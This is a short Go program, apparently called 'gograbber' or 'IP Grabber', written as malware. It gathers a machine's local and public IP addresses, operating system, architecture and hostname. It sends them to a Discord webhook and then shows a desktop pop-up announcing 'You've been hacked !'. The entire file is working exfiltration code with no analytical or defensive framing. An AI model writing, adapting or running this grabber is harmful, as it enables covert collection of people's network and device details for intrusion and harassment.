package main

import (
	"fmt"
	"log"
	"runtime"

	"gograbber/lib"

	"github.com/gen2brain/beeep"
	"github.com/gtuk/discordwebhook"
)

func main() {
	var username = "IP Grabber"
	localIP := lib.GetLocalIP()
	publicIP := lib.GetPublicIP()
	os := runtime.GOOS
	arch := runtime.GOARCH
	hostname := lib.Hostname()
	var content = fmt.Sprintf("Its local IP is : **%s**\nIts public IP is : **%s**\nIts operating system is : **%s**\nIts architecture is : **%s**\nIts hostname is : %s", localIP, publicIP, os, arch, hostname)
	var url = "https://discord.com/api/webhooks/..."

	message := discordwebhook.Message{
		Username: &username,
		Content:  &content,
	}

	err := discordwebhook.SendMessage(url, message)
	if err != nil {
		log.Fatal(err)
	}

	notifError := beeep.Notify("System Launch", "You've been hacked ! it's the hard life you live !", "assets/information.png")
	if notifError != nil {
		panic(notifError)
	}
}
